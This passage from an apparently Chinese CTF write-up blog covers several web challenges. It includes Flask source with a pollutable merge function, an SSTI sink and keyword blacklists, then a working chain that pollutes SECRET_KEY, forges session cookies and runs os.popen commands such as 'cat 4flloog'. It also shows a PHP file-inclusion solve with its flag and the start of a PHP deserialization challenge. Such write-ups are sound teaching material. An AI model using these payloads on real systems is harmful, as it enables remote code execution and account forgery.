        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"美式咖啡"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">9.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"1.png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"橙c美式"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">19.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"2.png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"摩卡"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">29.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"3.png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"卡布奇诺"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">19.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"4.png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"冰拿铁"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">29.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"5.png"</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>
                         error_message<span class="token operator">=</span>error_message<span class="token punctuation">,</span>
                         session<span class="token operator">=</span>session<span class="token punctuation">,</span>
                         products<span class="token operator">=</span>products<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/add'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">adddd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
            &lt;html>
                &lt;body style="background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;">
                    &lt;h2>添加商品&lt;/h2>
                    &lt;form id="productForm">
                        &lt;p>商品名称: &lt;input type="text" id="name">&lt;/p>
                        &lt;p>商品价格: &lt;input type="text" id="price">&lt;/p>
                        &lt;button type="button" onclick="submitForm()">添加商品&lt;/button>
                    &lt;/form>
                    &lt;script>
                        function submitForm() &#123;
                            const nameInput = document.getElementById('name').value;
                            const priceInput = document.getElementById('price').value;

                            fetch(`/add?price=$&#123;encodeURIComponent(priceInput)&#125;`, &#123;
                                method: 'POST',
                                headers: &#123;
                                    'Content-Type': 'application/json',
                                &#125;,
                                body: nameInput
                            &#125;)
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(error => console.error('错误:', error));
                        &#125;
                    &lt;/script>
                &lt;/body>
            &lt;/html>
        '''</span>
    <span class="token keyword">elif</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                raw_data <span class="token operator">=</span> request<span class="token punctuation">.</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> check<span class="token punctuation">(</span>raw_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token comment">#检测添加的商品是否合法</span>
                    <span class="token keyword">return</span> <span class="token string">"该商品违规，无法上传"</span>
                json_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>raw_data<span class="token punctuation">)</span>

                <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>json_data<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token string">"添加失败1"</span>

                merge<span class="token punctuation">(</span>json_data<span class="token punctuation">,</span> add<span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token string">"你无法添加商品哦"</span>

            <span class="token keyword">except</span> <span class="token punctuation">(</span>UnicodeDecodeError<span class="token punctuation">,</span> json<span class="token punctuation">.</span>JSONDecodeError<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">"添加失败2"</span>
            <span class="token keyword">except</span> TypeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"添加失败3"</span></span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"添加失败4"</span></span>
        <span class="token keyword">return</span> <span class="token string">"添加失败5"</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/aaadminnn'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">and</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'permission'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        permission <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'permission'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> check1<span class="token punctuation">(</span>permission<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># 检测添加的商品是否合法</span>
            <span class="token keyword">return</span> <span class="token string">"非法权限"</span>

        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'&lt;script>alert("上传成功！");window.location.href="/aaadminnn";&lt;/script>'</span>

        upload_form <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
        &lt;h2>商品管理系统&lt;/h2>
        &lt;form method=POST enctype=multipart/form-data style="margin:20px;padding:20px;border:1px solid #ccc">
            &lt;h3>上传新商品&lt;/h3>
            &lt;input type=file name=file required style="margin:10px">&lt;br>
            &lt;small>支持格式：jpg/png（最大2MB）&lt;/small>&lt;br>
            &lt;input type=submit value="立即上传" style="margin:10px;padding:5px 20px">
        &lt;/form>
        '''</span>

        original_template <span class="token operator">=</span> <span class="token string">'Hello admin!!!Your permissions are&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>permission<span class="token punctuation">)</span>
        new_template <span class="token operator">=</span> original_template <span class="token operator">+</span> upload_form

        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>new_template<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"&lt;script>alert('You are not an admin');window.location.href='/'&lt;/script>"</span>




<span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v
        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>raw_data<span class="token punctuation">,</span> forbidden_keywords<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    检查原始数据中是否包含禁止的关键词
    如果包含禁止关键词返回 True，否则返回 False
    """</span>
    <span class="token comment"># 设置默认禁止关键词</span>
    <span class="token keyword">if</span> forbidden_keywords <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        forbidden_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"app"</span><span class="token punctuation">,</span> <span class="token string">"config"</span><span class="token punctuation">,</span> <span class="token string">"init"</span><span class="token punctuation">,</span> <span class="token string">"globals"</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"SECRET"</span><span class="token punctuation">,</span> <span class="token string">"pardir"</span><span class="token punctuation">,</span> <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"mro"</span><span class="token punctuation">,</span> <span class="token string">"subclasses"</span><span class="token punctuation">,</span> <span class="token string">"builtins"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"open"</span><span class="token punctuation">,</span> <span class="token string">"file"</span><span class="token punctuation">,</span> <span class="token string">"import"</span><span class="token punctuation">,</span> <span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"ls"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"base"</span><span class="token punctuation">,</span> <span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"read"</span><span class="token punctuation">]</span>

    <span class="token comment"># 检查是否包含任何禁止关键词</span>
    <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>keyword <span class="token keyword">in</span> raw_data <span class="token keyword">for</span> keyword <span class="token keyword">in</span> forbidden_keywords<span class="token punctuation">)</span>


param_black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'session'</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'%1c'</span><span class="token punctuation">,</span> <span class="token string">'%1d'</span><span class="token punctuation">,</span> <span class="token string">'%1f'</span><span class="token punctuation">,</span> <span class="token string">'%1e'</span><span class="token punctuation">,</span> <span class="token string">'%20'</span><span class="token punctuation">,</span> <span class="token string">'%2b'</span><span class="token punctuation">,</span> <span class="token string">'%2c'</span><span class="token punctuation">,</span> <span class="token string">'%3c'</span><span class="token punctuation">,</span> <span class="token string">'%3e'</span><span class="token punctuation">,</span> <span class="token string">'%c'</span><span class="token punctuation">,</span> <span class="token string">'%2f'</span><span class="token punctuation">,</span>
                    <span class="token string">'b64decode'</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">,</span> <span class="token string">'encode'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'cat'</span><span class="token punctuation">,</span>  <span class="token string">'flag'</span><span class="token punctuation">,</span>  <span class="token string">'set'</span><span class="token punctuation">,</span>  <span class="token string">'self'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">,</span>  <span class="token string">'pop('</span><span class="token punctuation">,</span>
                    <span class="token string">'setdefault'</span><span class="token punctuation">,</span> <span class="token string">'char'</span><span class="token punctuation">,</span> <span class="token string">'lipsum'</span><span class="token punctuation">,</span> <span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'endfor'</span><span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'='</span> <span class="token punctuation">]</span>


<span class="token comment"># 增强WAF防护</span>
<span class="token keyword">def</span> <span class="token function">waf_check</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 检查是否有不合法的字符</span>
    <span class="token keyword">for</span> black <span class="token keyword">in</span> param_black_list<span class="token punctuation">:</span>
        <span class="token keyword">if</span> black <span class="token keyword">in</span> value<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token comment"># 检查是否是自动化工具请求</span>
<span class="token keyword">def</span> <span class="token function">is_automated_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_agent <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'User-Agent'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 如果是常见的自动化工具的 User-Agent，返回 True</span>
    automated_agents <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fenjing'</span><span class="token punctuation">,</span> <span class="token string">'curl'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'bot'</span><span class="token punctuation">,</span> <span class="token string">'spider'</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>agent <span class="token keyword">in</span> user_agent <span class="token keyword">for</span> agent <span class="token keyword">in</span> automated_agents<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check1</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> is_automated_request<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Automated tool detected"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>

    <span class="token comment"># 使用WAF机制检查请求的合法性</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> waf_check<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>

    <span class="token keyword">return</span> <span class="token boolean">False</span>


app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5014</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>直到看到源码中的对POST上传的参数的检测中的代码块</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250625154416313.png" alt="image-20250625154416313"></p>
<p>原来即使是污染成功了也会返回这句话</p>
<p>分析上面的源码，发现还存在一个&#x2F;aaadminnn路由</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250625154717204.png" alt="image-20250625154717204"></p>
<p>他会判断session中是的name是不是等于admin并且检验当前的permission是不是不为0</p>
<p>这里还需要伪造session可以通过污染密钥，permission可以通过ssti更改权限，原因是</p>
<pre class="line-numbers language-none"><code class="language-none"> permission &#x3D; session.get(&#39;permission&#39;)
original_template &#x3D; &#39;Hello admin!!!Your permissions are&#123;&#125;&#39;.format(permission)
        new_template &#x3D; original_template + upload_form

        return render_template_string(new_template)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>permission的值使通过session.get()获得的，水命permission的值完全可控，而且不存在任何过滤，并且他直接拼接到了字符串中并且通过render_template_string()来进行渲染。</p>
<p>接下来主要的流程就是通过密钥的污染使permission可以使用被污染的密钥进行SSTI</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
    &quot;__globals__&quot;: &#123;
        &quot;app&quot;: &#123;
            &quot;config&quot;: &#123;&#125;
        &#125;
    &#125;,
    &quot;SECRET_KEY&quot;: &quot;123&quot;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同样进行编码</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
        &quot;__\u0067\u006c\u006f\u0062\u0061\u006c\u0073__&quot; : &#123;
            &quot;\u0061\u0070\u0070&quot; : &#123;
                &quot;\u0063\u006f\u006e\u0066\u0069\u0067&quot; : &#123;
                    &quot;\u0053ECRET_KEY&quot; :&quot;123&quot;
                &#125;
            &#125;
        &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>成功污染密钥为p</p>
<p>下面是打通的ssti的利用链</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;self.__init__.__globals__.__builtins__[&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls&quot;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>self.<strong>init</strong>.__globals__用于获取当前对象的全局命名空间，<code>__builtins__</code> - 这是 Python 的一个内置模块，包含所有内置函数，接着使用import函数导入os模块，再调用os模块中的popen()函数，再用popen()函数执行ls命令，<code>.read()</code> - 读取命令执行的结果</p>
<p>这里先要利用一个工具脚本对原本的session进行解密</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250626165608444.png" alt="image-20250626165608444"></p>
<pre class="line-numbers language-none"><code class="language-none">python flask_session_cookie_manager3.py decode -s &quot;123&quot; -c &quot;eyJuYW1lIjoiY3VzdG9tZXIiLCJwZXJtaXNzaW9uIjowfQ.aEbpMQ.RzfFYnE7I6sqBcZW2R1PfAxTepk&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>带着解密的session通过GET方式访问</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250626165812346.png"></p>
<p>得到flag的位置在4flloog中</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250626170157293.png" alt="image-20250626170157293"></p>
<pre class="line-numbers language-none"><code class="language-none">python flask_session_cookie_manager3.py encode -s &quot;123&quot; -t &quot;&#123;&#39;name&#39;:&#39;admin&#39;,&#39;permission&#39;:&#39;&#123;&#123;self.__init__.__globals__.__builtins__[\&quot;__import__\&quot;](\&quot;os\&quot;).popen(\&quot;cat 4flloog\&quot;).read()&#125;&#125;&#39;&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250626224338885.png"></p>
<p>使用上面的session访问即可得到flag。</p>
<h1 id="DeceptiFlag"><a href="#DeceptiFlag" class="headerlink" title="DeceptiFlag"></a>DeceptiFlag</h1><p>f12查看元素</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614005929951.png" alt="image-20250614005929951"></p>
<p>发现有一个隐藏输入框的部分试着删除上面的部分，得到另外的一个输入框，根据背景图的提示可以输入和题目提供的hint可以输入xiyangyang和huitailang</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614010644463.png" alt="image-20250614010644463"></p>
<p>发现上面有一个?file&#x3D;flag,尝试删除file参数的参数值，发现会报错，分析一下报错内容</p>
<p>尝试加载（require_once)加载一个.php文件的时候报错了，说明之前的参数值为flag的时候读取的是flag.php文件的内容</p>
<p>在f12查看cookie的时候发现存在一个hint</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614011936495.png" alt="image-20250614011936495"></p>
<p>进行base64解码</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614012150932.png" alt="image-20250614012150932"></p>
<p>说明flag在这个目录的文件夹下面，直接尝试进行读取</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614012358171.png" alt="image-20250614012358171"></p>
<p>可以看到这里阻止了直接从根目录进行文件包含</p>
<p>可以想到使用伪协议来读取文件，这里是对本地的磁盘文件进行读取</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614013355732.png" alt="image-20250614013355732"></p>
<p>进行base-64解码就可以得到flag了</p>
<p>flag{6d4a7988-954c-4f3f-80ec-713823a65376}</p>
<h1 id="ez-php"><a href="#ez-php" class="headerlink" title="ez-php"></a>ez-php</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">GOGOGO</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$dengchao</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Go Go Go~ 出发喽！"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dengchao</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">DouBao</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$dao</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$Dagongren</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$Bagongren</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Dagongren</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Bagongren</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Dagongren</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Bagongren</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Dagongren</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Bagongren</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dao</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'诗人我吃！'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">HeiCaFei</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$HongCaFei</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">HongCaFei</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">=></span> <span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
